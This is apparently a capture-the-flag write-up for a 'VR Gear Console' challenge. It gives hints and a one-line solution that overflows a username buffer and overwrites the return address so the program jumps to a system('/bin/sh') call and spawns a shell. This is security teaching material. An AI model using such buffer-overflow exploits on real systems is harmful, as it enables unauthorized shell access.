# VR Gear Console
Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/5206d6e095708fbcc2dfa33cd2a8b819
## HINTS
- What happens if you read in more characters than the length of the username buffer?
- You should look at an ascii table to see what character you need to choose.
- Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
- "cat file - | vrgearconsole " will keep the pipe open for commands.

## SOLUTION
- determine the return address: we want to execute system("/bin/sh"), so need to jump to address of the push before call to system
- solution:
```
(echo -e "aaaabaaacaaadaaaeaaafaaagaaahaaa\xd5\x86\x04\x08"; cat -) | ./vrgearconsole
```
